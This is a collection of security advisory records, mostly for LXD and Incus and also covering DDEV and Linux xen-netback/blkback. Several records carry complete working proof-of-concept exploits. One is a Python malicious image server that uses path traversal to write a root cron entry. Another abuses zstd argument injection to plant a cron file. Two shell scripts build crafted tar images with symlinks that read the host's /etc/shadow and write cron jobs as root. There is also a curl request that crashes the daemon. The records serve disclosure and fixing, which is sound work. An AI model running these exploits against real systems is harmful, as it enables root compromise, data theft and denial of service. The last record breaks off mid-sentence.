items.title: LXD has CreateCustomVolumeFromBackup nil-pointer dereference on volumes[0].snapshots[*].expires_at
items.description:
## Summary

(sibling-field variant of CVE-2026-40197 fix 05bc272)

`(*lxdBackend).CreateCustomVolumeFromBackup` in [`lxd/storage/backend_lxd.go`](https://github.com/canonical/lxd/blob/05bc272/lxd/storage/backend_lxd.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `EntitlementCanCreateStorageVolumes` permission on any project can crash the `lxd` daemon by uploading a backup tarball whose `volumes[0].snapshots[*].expires_at` field is omitted.

This is a sibling-field variant of the CVE-2026-40197 fix (commit `05bc272`, "Validate snapshots from backup.yaml are non-nil", cherry-picked from incus commit `985a1dedf` / GHSA-r7w7-mmxr-47r9). That fix added `if snap == nil` guards at several consumer sites, but did not guard the adjacent `*snapshot.ExpiresAt` deref at line 8216. Every other consumer of this field in the same file already gates the deref with `if … != nil` (e.g. lines 1010-1011, 1274-1275, 1856-1857, 2454-2455, 5070-5071, 5527-5528). Asymmetric guard is the bug.

## Vulnerable code

[`lxd/storage/backend_lxd.go`](https://github.com/canonical/lxd/blob/05bc272/lxd/storage/backend_lxd.go), `CreateCustomVolumeFromBackup`:

```go
// Line 8141-8150 — earliest snapshot validation pass (caches s == nil)
for i, snap := range customVol.Snapshots {
    if snap == nil {
        return fmt.Errorf("Nil custom volume snapshot definition found at index %d", i)
    }
    err = drivers.ValidVolumeName(snap.Name)
    ...
}

// Line 8196-8216 — the snapshot DB-create loop
for i, s := range customVol.Snapshots {
    if s == nil {
        return fmt.Errorf("Nil custom volume snapshot definition found at index %d", i)
    }
    snapshot := s
    ...
    // Line 8216 — UNGUARDED *time.Time deref:
    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,
        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,
        *snapshot.ExpiresAt,           // <-- panics when expires_at omitted in YAML
        snapVol.ContentType(), true, true)
```

`ExpiresAt` is declared `*time.Time` ([`shared/api/storage_pool_volume_snapshot.go`](https://github.com/canonical/lxd/blob/05bc272/shared/api/storage_pool_volume_snapshot.go)). Every other consumer in the same file already uses the safe pattern (`if … != nil { … = *… }`):

| Line | Code | Guarded? |
|------|------|----------|
| 1010-1011 | rootVol.Snapshots[i].ExpiresAt | YES |
| 1274-1275 | rootVol.Snapshots[i].ExpiresAt | YES |
| 1558-1559 | srcSnap.ExpiresAt | YES |
| 1856-1857 | rootVol.Snapshots[i].ExpiresAt | YES |
| 2454-2455 | rootVol.Snapshots[i].ExpiresAt | YES |
| 5070-5071 | customVol.Snapshots[i].ExpiresAt | YES |
| 5527-5528 | srcSnap.ExpiresAt | YES |
| **8216** | **CreateCustomVolumeFromBackup snapshot.ExpiresAt** | **NO** |

## Reach

1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `EntitlementCanCreateStorageVolumes` entitlement on any project. Same auth gate as CVE-2026-40197.
2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-LXD-name: <name>`.
3. Body is a tar containing [`backup/index.yaml`](https://github.com/canonical/lxd/blob/05bc272/backup/index.yaml) with `type: custom`, `volumes[0]` non-nil, and `volumes[0].snapshots[0]` non-nil but missing `expires_at`.
4. `lxd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the validations at 8141-8150 + 8197 pass (snapshot pointer is non-nil, name is valid) -> `*snapshot.ExpiresAt` on line 8216 panics on the nil `*time.Time`.
5. The Go runtime kills the entire `lxd` daemon process. Repeated POSTs are a persistent denial of service.

Minimal [`backup/index.yaml`](https://github.com/canonical/lxd/blob/05bc272/backup/index.yaml):

```yaml
name: poc-vol
backend: dir
pool: default
type: custom
optimized: false
optimized_header: false
snapshots: [snap0]
config:
  version: 2
  pools:
    - {name: default, driver: dir, config: {}}
  volumes:
    - name: poc-vol
      type: custom
      pool: default
      content_type: filesystem
      config: {}
      snapshots:
        - name: snap0
          description: snap0
          config: {}
          # expires_at intentionally omitted
```

## Proof of concept (end-to-end against running daemon)

Bundled in the report: `make_backup.sh` + the resulting 516-byte `poc-vol-lxd.tar.gz`.

Tested against `lxd 6.8` (HEAD of `canonical/lxd` at the time of testing, built from source with `make deps && go build -tags libsqlite3 ./lxd`). Daemon started with default `dir` storage pool.

```bash
$ curl -s --unix-socket /var/lib/lxd/unix.socket -X POST \
    --data-binary @/tmp/poc-vol-lxd.tar.gz \
    -H 'Content-Type: application/octet-stream' \
    -H 'X-LXD-name: poc-vol' \
    http://lxd/1.0/storage-pools/default/volumes/custom
{"type":"async","status":"Operation created","status_code":100,...}

$ ps -ef | grep lxd | grep -v grep    # daemon GONE
```

Daemon panic from `/tmp/lxd.out`:

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x11015e8]

goroutine 683 [running]:
github.com/canonical/lxd/lxd/storage.(*lxdBackend).CreateCustomVolumeFromBackup(...)
    github.com/canonical/lxd/lxd/storage/backend_lxd.go:8216 +0xf58
main.createStoragePoolVolumeFromBackup.func6(...)
    github.com/canonical/lxd/lxd/storage_volumes.go:2879 +0x2a0
github.com/canonical/lxd/lxd/operations.(*Operation).start.func1(...)
    github.com/canonical/lxd/lxd/operations/operations.go:588 +0x6c
created by github.com/canonical/lxd/lxd/operations.(*Operation).start in goroutine 655
    github.com/canonical/lxd/lxd/operations/operations.go:541 +0x2b8
```

Stack frame [`backend_lxd.go:8216`](https://github.com/canonical/lxd/blob/05bc272/backend_lxd.go#L8216) is the literal `*snapshot.ExpiresAt` line.

## Impact

- **Severity:** denial of service against the entire `lxd` daemon process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.
- **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.
- **Network attack surface:** the LXD REST API on `:8443` or the unix socket.
- **CWE-476** — Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).
- **Versions:** confirmed at `lxd 6.8` (HEAD); the same code exists in the v5.21 LTS line as the parent fix `05bc272` was a cherry-pick from incus.

## Suggested fix

Mirror the guard pattern already in use elsewhere in this file:

```diff
--- a/lxd/storage/backend_lxd.go
+++ b/lxd/storage/backend_lxd.go
@@ -8210,9 +8210,14 @@ func (b *lxdBackend) CreateCustomVolumeFromBackup(...) error {
         snapVolStorageName := project.StorageVolume(srcBackup.Project, fullSnapName)
         snapVol := b.GetNewVolume(drivers.VolumeTypeCustom, drivers.ContentType(customVol.ContentType), snapVolStorageName, snapshot.Config)

         // Validate config and create database entry for new storage volume.
         // Strip unsupported config keys (in case the export was made from a different type of storage pool).
-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)
+        var snapExpiryDate time.Time
+        if snapshot.ExpiresAt != nil {
+            snapExpiryDate = *snapshot.ExpiresAt
+        }
+
+        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)
         if err != nil {
             return err
         }
```

## Related advisories

- `GHSA-r7w7-mmxr-47r9` (CVE-2026-40197) / commit `05bc272` (cherry-pick of incus `985a1dedf`) — parent fix: added `s == nil` checks at multiple consumer sites, missed the `*snapshot.ExpiresAt` deref at line 8216.
- `lxc/incus GHSA-xhqx-mgh3-3h7q` (sibling report filed by same reporter against the upstream-equivalent line [`internal/server/storage/backend.go:7731`](https://github.com/canonical/lxd/blob/05bc272/internal/server/storage/backend.go#L7731) in incus).

The shape is "incomplete fix on a sibling field of the same struct" — the maintainer walked nil-checks for the iteration-variable pointer but did not walk every adjacent pointer field that the loop body still dereferences.

## Reporter notes

Reported via Privately-Reported Vulnerability against `canonical/lxd` by tonghuaroot.

items.title: LXD has arbitrary file write on client due to trusted image hash
items.description:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x

### Summary

An arbitrary file write exists in the Incus client when a malicious image
server returns a crafted `Incus-Image-Hash` header. This can lead to
arbitrary command execution as root on the server.


### Details

- `cmd/incusd/images.go:611-684` handles `source.type=url` by HEADing the user-supplied URL, reading `Incus-Image-Hash` and `Incus-Image-URL`, and passing them to `imageDownload()` as `Alias`
 and `Server`.
- `cmd/incusd/daemon_images.go:91-92` defaults `fp` to the caller-controlled alias string.
- `cmd/incusd/daemon_images.go:333-335` builds `destName := filepath.Join(destDir, fp)`.
- `cmd/incusd/daemon_images.go:469-523` enters the `direct` protocol branch, opens `destName` with `os.Create()`, and copies the HTTP response into that file.
- `cmd/incusd/daemon_images.go:528-532` validates the SHA-256 only after the file has already been created and populated.
- `cmd/incusd/daemon_images.go:337-344` cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.

A malicious image server returning something along the following will cause
the arbitrary file write.

```
Incus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce
Incus-Image-URL: http://attacker/payload
```


### PoC

The script below creates a malicious image server and requests an Incus
server to fetch the image. File write occurs when the image is unpacked.

The following script was generated by an LLM.

```
#!/usr/bin/env python3
"""Direct image URL hash path traversal to transient host cron write.

For `source.type=url`, Incus first HEADs an attacker-controlled URL and trusts
the `Incus-Image-Hash` header as the expected fingerprint. The direct download
path then creates `/var/lib/incus/images/<hash>` before validating that the hash
is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the
image directory.

Default mode is dry-run. With --execute-trigger this script starts a tiny HTTP
server, returns a traversal hash pointing at cron, streams the cron payload, and
keeps the response open so the daemon-side cleanup does not immediately remove
the file.
"""

from __future__ import annotations

import argparse
import http.client
import json
import shlex
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any


DEFAULT_SOCKET = "/var/lib/incus/unix.socket"
DEFAULT_TRAVERSAL = "../../../../etc/cron.d/incus-direct-image-url-rce"


class UnixHTTPConnection(http.client.HTTPConnection):
    def __init__(self, socket_path: str, timeout: int = 120):
        super().__init__("incus", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.socket_path)
        self.sock = sock


class RCEHTTPServer(ThreadingHTTPServer):
    hash_path: str
    advertise_url: str
    payload: bytes
    hold_seconds: int
    payload_requested: threading.Event


class DirectImageHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "direct-image-rce/1.0"

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[http] {self.address_string()} - {fmt % args}", flush=True)

    def do_HEAD(self) -> None:
        if self.path != "/stage":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        self.send_response(200)
        self.send_header("Incus-Image-Hash", srv.hash_path)
        self.send_header("Incus-Image-URL", srv.advertise_url.rstrip("/") + "/payload")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_GET(self) -> None:
        if self.path != "/payload":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        srv.payload_requested.set()

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(srv.payload)
        self.wfile.flush()
        print(f"[*] payload bytes written to daemon response; holding for {srv.hold_seconds}s", flush=True)
        time.sleep(srv.hold_seconds)
        self.close_connection = True


def quote(value: str) -> str:
    return urllib.parse.quote(value, safe="")


def tls_context(args: argparse.Namespace) -> ssl.SSLContext:
    if args.insecure:
        ctx = ssl._create_unverified_context()
    else:
        ctx = ssl.create_default_context(cafile=args.cacert)

    if args.cert:
        ctx.load_cert_chain(args.cert, args.key)

    return ctx


def connection(args: argparse.Namespace) -> http.client.HTTPConnection:
    if args.url:
        parsed = urllib.parse.urlparse(args.url)
        if parsed.scheme != "https":
            raise ValueError("--url must use https")

        return http.client.HTTPSConnection(
            parsed.hostname,
            parsed.port or 8443,
            timeout=args.timeout,
            context=tls_context(args),
        )

    return UnixHTTPConnection(args.socket, timeout=args.timeout)


def request_json(
    args: argparse.Namespace,
    method: str,
    path: str,
    obj: dict[str, Any] | None,
    allow_error: bool = False,
) -> tuple[int, dict[str, Any]]:
    body = None if obj is None else json.dumps(obj).encode("utf-8")
    headers = {"Host": "incus"}
    if body is not None:
        headers["Content-Type"] = "application/json"

    conn = connection(args)
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()

    try:
        data = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        data = {"raw": raw.decode("utf-8", "replace")}

    if not allow_error and (resp.status >= 400 or data.get("type") == "error"):
        raise RuntimeError(f"{method} {path} failed with HTTP {resp.status}: {data}")

    return resp.status, data


def images_path(project: str) -> str:
    return "/1.0/images?project=" + quote(project)


def cron_payload(command: str) -> bytes:
    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode("utf-8")


def image_url_body(project_url: str, public: bool) -> dict[str, Any]:
    return {
        "source": {
            "type": "url",
            "url": project_url.rstrip("/") + "/stage",
        },
        "public": public,
    }


def start_server(args: argparse.Namespace, payload: bytes) -> RCEHTTPServer:
    server = RCEHTTPServer((args.listen_host, args.listen_port), DirectImageHandler)
    server.hash_path = args.hash_path
    server.advertise_url = args.advertise_url
    server.payload = payload
    server.hold_seconds = args.hold_seconds
    server.payload_requested = threading.Event()

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def main() -> int:
    parser = argparse.ArgumentParser(description="Incus direct image URL hash traversal cron RCE PoC")
    parser.add_argument("--socket", default=DEFAULT_SOCKET, help="Incus Unix socket")
    parser.add_argument("--url", help="remote Incus URL, for example https://host.ctf:8443")
    parser.add_argument("--cert", help="client certificate for remote Incus")
    parser.add_argument("--key", help="client private key for remote Incus")
    parser.add_argument("--cacert", help="CA certificate for remote Incus")
    parser.add_argument("--insecure", action="store_true", help="disable TLS verification")
    parser.add_argument("--timeout", type=int, default=120, help="Incus request timeout")
    parser.add_argument("--project", default="default", help="project used for image import")
    parser.add_argument("--public", action="store_true", help="mark imported image public")
    parser.add_argument("--listen-host", default="0.0.0.0", help="HTTP listen address")
    parser.add_argument("--listen-port", type=int, default=8088, help="HTTP listen port")
    parser.add_argument("--advertise-url", default="http://127.0.0.1:8088", help="URL reachable by the Incus daemon")
    parser.add_argument("--hash-path", default=DEFAULT_TRAVERSAL, help="value returned in Incus-Image-Hash")
    parser.add_argument("--hold-seconds", type=int, default=90, help="keep payload response open for this many seconds")
    parser.add_argument("--command", default="id > /tmp/incus-direct-image-url-rce", help="command cron should run")
    parser.add_argument("--execute-trigger", action="store_true", help="start server and trigger POST /1.0/images")
    parser.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute-trigger")
    args = parser.parse_args()

    if bool(args.cert) != bool(args.key):
        parser.error("--cert and --key must be supplied together")
    if args.execute_trigger and not args.yes_i_understand_this_writes_host_file:
        parser.error("--execute-trigger requires --yes-i-understand-this-writes-host-file")

    payload = cron_payload(args.command)
    trigger_body = image_url_body(args.advertise_url, args.public)

    print("[*] exploit primitive: direct image URL unvalidated hash path host write")
    print(f"[*] HEAD URL served to daemon: {args.advertise_url.rstrip()}/stage")
    print(f"[*] returned Incus-Image-Hash: {args.hash_path}")
    print(f"[*] returned Incus-Image-URL: {args.advertise_url.rstrip()}/payload")
    print(f"[*] expected escaped host target from default Incus dir: /etc/cron.d/incus-direct-image-url-rce")
    print(f"[*] cron payload: {payload.decode().rstrip()}")
    print(f"[*] trigger body: {json.dumps(trigger_body, sort_keys=True)}")

    if not args.execute_trigger:
        print("[*] dry run only; pass --execute-trigger and --yes-i-understand-this-writes-host-file to test")
        return 0

    server = start_server(args, payload)
    print(f"[*] HTTP server listening on {args.listen_host}:{args.listen_port}")

    status, data = request_json(args, "POST", images_path(args.project), trigger_body, allow_error=True)
    print(f"[*] POST /1.0/images HTTP {status}: {json.dumps(data, indent=2, sort_keys=True)}")

    if server.payload_requested.wait(timeout=min(args.hold_seconds, 30)):
        print("[*] daemon requested payload; cron file should exist until the held response is released")
    else:
        print("[!] daemon did not request payload within the wait window")

    print("[*] leaving HTTP server active for the remaining hold window")
    time.sleep(max(0, args.hold_seconds - 30))
    server.shutdown()
    server.server_close()
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except BrokenPipeError:
        raise SystemExit(1)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```


### Impact

An arbitrary file write on the client with root privileges; possibly leading
to arbitrary command execution.

items.title: LXD has argument injection in backup compression algorithm leading to AFW and ACE
items.description:
Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4

### Summary

Improper validation of user-provided backup compression algorithm leads to
argument injection in the constructed command line. This leads to an
arbitrary file write on the host, possibly leading to arbitrary command
execution.


### Details

Incus validates `compression_algorithm` by parsing it into fields and checking
only the first token against an allowlist:

```go
fields, err := shellquote.Split(value)
...
if !slices.Contains([]string{"bzip2", "gzip", "lz4", "lzma", "pigz", "pzstd", "pxz", "tar2sqfs", "xz", "zstd"}, fields[0]) {
    return fmt.Errorf("Compression algorithm %q isn't currently supported", fields[0])
}
_, err = exec.LookPath(fields[0])
```

Extra arguments are not rejected. `compressFile()` then prepends `-c` and
passes the remaining user-supplied fields to the compressor:

```go
args := []string{"-c"}
if len(fields) > 1 {
    args = append(args, fields[1:]...)
}
cmd := exec.Command(fields[0], args...)
cmd.Stdin = infile
cmd.Stdout = outfile
```

With a value like:

```text
zstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

the daemon executes the equivalent of:

```text
zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

### PoC

```
python3 poc.py \
	--insecure --url https://remote-incus:8443 \
	--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \
	--instance c01 \
	--execute --yes-i-understand-this-writes-host-file
```

The following was generated by an LLM model.

```
#!/usr/bin/env python3
"""Short remote Incus backup compression zstd cron RCE PoC.

Dry-run is the default.  --execute uploads a cron payload into an instance and
then asks Incus for a direct backup with a zstd argument-injection compressor:

    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- <source>

The direct backup may fail after zstd runs; the host file write is the primitive.
Use only on an authorized Incus server.
"""

from __future__ import annotations

import argparse
import json
import os
import shlex
import sys
import urllib.parse
from pathlib import PurePosixPath
from typing import Any

import requests


def q(value: str) -> str:
    return urllib.parse.quote(value, safe="")


def api(base: str, endpoint: str, **params: str) -> str:
    return base.rstrip("/") + endpoint + ("?" + urllib.parse.urlencode(params) if params else "")


def project_instance(project: str, instance: str) -> str:
    return instance if project == "default" else f"{project}_{instance}"


def clean_guest_path(path: str) -> str:
    if not path.startswith("/"):
        raise ValueError("--guest-path must be absolute")
    if ".." in PurePosixPath(path).parts:
        raise ValueError("--guest-path must not contain '..'")
    return os.path.normpath("/" + path.lstrip("/")).lstrip("/")


def source_path(args: argparse.Namespace) -> str:
    if args.source_host_path:
        return args.source_host_path
    return os.path.join(
        args.incus_dir,
        "storage-pools",
        args.pool,
        args.storage_kind,
        project_instance(args.project, args.instance),
        "rootfs",
        clean_guest_path(args.guest_path),
    )


def cron(command: str) -> bytes:
    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode()


def session(args: argparse.Namespace) -> requests.Session:
    s = requests.Session()
    s.verify = False if args.insecure else (args.cacert or True)
    if args.cert or args.key:
        s.cert = (args.cert, args.key)
    if args.token:
        s.headers["Authorization"] = "Bearer " + args.token
    s.headers["User-Agent"] = "incus-zstd-backup-rce-poc"
    if args.insecure:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    return s


def check(resp: requests.Response, what: str) -> requests.Response:
    if resp.status_code >= 400:
        try:
            detail: Any = resp.json()
        except Exception:
            detail = resp.text[:2048]
        raise RuntimeError(f"{what} failed: HTTP {resp.status_code}: {detail}")
    return resp


def upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/files", project=args.project, path=args.guest_path)
    headers = {
        "Content-Type": "application/octet-stream",
        "X-Incus-type": "file",
        "X-Incus-write": "overwrite",
        "X-Incus-uid": "0",
        "X-Incus-gid": "0",
        "X-Incus-mode": "0644",
    }
    print(f"[*] uploading cron payload to {args.instance}:{args.guest_path}")
    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), "payload upload")


def trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -> None:
    url = api(args.url, f"/1.0/instances/{q(args.instance)}/backups", project=args.project)
    print("[*] sending direct backup request")
    resp = s.post(
        url,
        data=json.dumps(body).encode(),
        headers={"Accept": "application/octet-stream", "Content-Type": "application/json"},
        timeout=args.timeout,
        stream=True,
    )
    print(f"[*] backup HTTP {resp.status_code}")
    resp.close()
    if resp.status_code >= 400:
        print("[*] HTTP error after compressor launch is possible; check whether the cron file was written")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Remote Incus zstd backup-compression cron RCE PoC")
    p.add_argument("--url", required=True, help="https://host:8443")
    p.add_argument("--cert", help="client certificate PEM")
    p.add_argument("--key", help="client private key PEM")
    p.add_argument("--cacert", help="CA certificate PEM")
    p.add_argument("--token", help="bearer token")
    p.add_argument("--insecure", action="store_true", help="disable TLS verification")
    p.add_argument("--timeout", type=int, default=180)

    p.add_argument("--project", default="default")
    p.add_argument("--instance", required=True)
    p.add_argument("--pool", default="default")
    p.add_argument("--storage-kind", choices=["containers", "virtual-machines"], default="containers")
    p.add_argument("--incus-dir", default="/var/lib/incus")
    p.add_argument("--guest-path", default="/incus-zstd-cron")
    p.add_argument("--source-host-path", help="override daemon-readable host path for the staged payload")
    p.add_argument("--cron-path", default="/etc/cron.d/incus-zstd-rce")
    p.add_argument("--command", default="date >/incus-zstd-rce; id >>/incus-zstd-rce")

    p.add_argument("--execute", action="store_true", help="stage payload and send backup request")
    p.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute")
    args = p.parse_args()

    if urllib.parse.urlparse(args.url).scheme != "https":
        p.error("--url must use https")
    if bool(args.cert) != bool(args.key):
        p.error("--cert and --key must be supplied together")
    if args.execute and not args.yes_i_understand_this_writes_host_file:
        p.error("--execute requires --yes-i-understand-this-writes-host-file")
    try:
        clean_guest_path(args.guest_path)
    except ValueError as exc:
        p.error(str(exc))

    args.url = args.url.rstrip("/")
    return args


def main() -> int:
    args = parse_args()
    src = source_path(args)
    payload = cron(args.command)
    compressor = f"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}"
    body = {"compression_algorithm": compressor, "instance_only": True}

    print("[*] target:", args.url)
    print("[*] project:", args.project)
    print("[*] instance:", args.instance)
    print("[*] source host path:", src)
    print("[*] cron path:", args.cron_path)
    print("[*] payload:", payload.decode().rstrip())
    print("[*] backup body:", json.dumps(body, sort_keys=True))

    if not args.execute:
        print("[*] dry run only; add --execute and the confirmation flag to act")
        return 0

    s = session(args)
    upload(s, args, payload)
    trigger_backup(s, args, body)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except BrokenPipeError:
        raise SystemExit(1)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```


### Impact

Improperly validated compression algorithm argument leads to argument
injection leading to arbitrary file write with `zstd` and possibly
arbitrary command execution.

items.title: LXD has arbitrary file read+write on host via rootfs/ symlink in malicious image
items.description:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv

### Summary

A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.


### Details

Incus validates an image as soon as it sees a normal `metadata.yaml` and
a `rootfs/` entry, but full extraction can later process a duplicate top-level
`rootfs` symlink. Later, the stopped-container file API opens
`d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to
it.

```
metadata.yaml
rootfs/
rootfs -> /
```

In practice, this allows a malicious actor to access the host's filesystem
with root privileges.


### PoC

Below, we map the container's rootfs to `/` on the host, but it can be
mapped anywhere. We then retrieve the host's `/etc/shadow` file and
create a file in `/`.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC rootfs symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar

# inject rootfs symlink
rmdir rootfs
ln -s / rootfs
tar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs


incus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink
incus init afrw-rootfs-symlink afrw-rootfs-symlink


# read
incus file pull afrw-rootfs-symlink/etc/shadow "${tmpdir}/shadow"
cat "${tmpdir}/shadow"

# write
printf 'afrw-rootfs-symlink\n' >"${tmpdir}/afrw-rootfs-symlink"
incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

items.title: DDEV incomplete tar symlink traversal fix allows host file overwrite - Incomplete fix of CVE-2026-32885
items.description: DDEV is an open-source tool for running local web development environments for PHP and Node.js. From 1.25.2 until 1.25.4, Untar in pkg/archive/archive.go validates an absolute tar symlink target after rebasing it beneath dest, but creates the symlink with the raw absolute Linkname. A crafted archive can therefore plant a host-absolute symlink and use a following regular-file entry to write outside the extraction directory. The flaw is reachable through remote add-on retrieval and database or file imports, and overwriting shell startup files, Git hooks, or cron entries can lead to code execution in the DDEV user's context. Unzip is not affected. This issue is fixed in version 1.25.4.

items.title: In the Linux kernel, the following vulnerability has been resolved: xen-netback: defer xenvif_mcast_addr_list_free() In…
items.description:
In the Linux kernel, the following vulnerability has been resolved:

xen-netback: defer xenvif_mcast_addr_list_free()

In order for the function to legitimately avoid locking/RCU, it needs to
run after all TX/RX processing has finished/stopped: Lookups happen from
xenvif_start_xmit(), while adds/removes happen from xenvif_tx_action()
(called out of xenvif_poll()).

Move the call out of xenvif_disconnect_data() (the call to the function
from connect()'s error path doesn't require any cleaning up there), and
put it past the synchronization point in backend_disconnect().

This is XSA-527 / CVE-2026-100081.

items.title: In the Linux kernel, the following vulnerability has been resolved: xen-netback: Fix UAF when reading statistics data T…
items.description:
In the Linux kernel, the following vulnerability has been resolved:

xen-netback: Fix UAF when reading statistics data

The network statistic data in the driver is protected by RCU.
Unfortunately when tearing down the queues after an error during
connecting to the frontend (e.g. due to illegal Xenstore data filled
in by the guest), the statistic data is being freed without
synchronizing the RCU state.  In case the data is being read via sysfs
in this phase, access to already freed memory or memory being in new
use is possible.

Fix that by calling synchronize_net() before freeing the queue data.

This is XSA-526 / CVE-2026-100080

items.title: In the Linux kernel, the following vulnerability has been resolved: xen-blkback: Avoid UAF when reading I/O statistics…
items.description:
In the Linux kernel, the following vulnerability has been resolved:

xen-blkback: Avoid UAF when reading I/O statistics

Reading I/O statistics via sysfs concurrently with tearing down a
frontend device might result in UAF or a NULL dereference, as the
reading of the statistics data is not synchronized with freeing the
data.

Use a rwlock for synchronizing.

This is XSA-528 / CVE-2026-100082

items.title: LXD has arbitrary file read+write on host via templates/ symlink in malicious image
items.description:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479

### Summary

A specially crafted image can be used to read or create/write arbitrary
files on the host; possibly leading to arbitrary command execution.


### Details

For container images, `internal/server/storage/utils.go` calls
`archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in
`shared/archive/archive.go` excludes device nodes, but it does not
reject a top-level `templates` symlink.

In practice, this allows a malicious actor to access an arbitrary
directory and edit arbitrary files in it.


### PoC

Below, we map the templates directory to `/etc/cron.d` on the host, but
it can be mapped anywhere. We then create a cronjob to run `id` as root.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
ln -s /etc/cron.d "${tmpdir}/img/templates"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC templates symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar
incus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink
incus init afrw-image-templates-symlink afrw-image-templates-symlink

incus config template ls afrw-image-templates-symlink

# read
#incus config template show afrw-image-templates-symlink $FILENAME

# write
printf "* * * * * root sh -c 'id>/pwned'\n" | incus config template create afrw-image-templates-symlink poc-32
#incus config template edit afrw-image-templates-symlink poc
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

items.title: LXD has arbitrary file write on host via `exec-output` symlink in crafted image
items.description:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv

### Summary

The `record-output` parameter of the `/instances/$name/exec` endpoint
stores the output of the command in the `exec-output` directory of the
instance. If `exec-output` is a symlink, file named `exec_UUID.stdout`
and `exec_UUID.stderr` can be written to an arbitrary location where
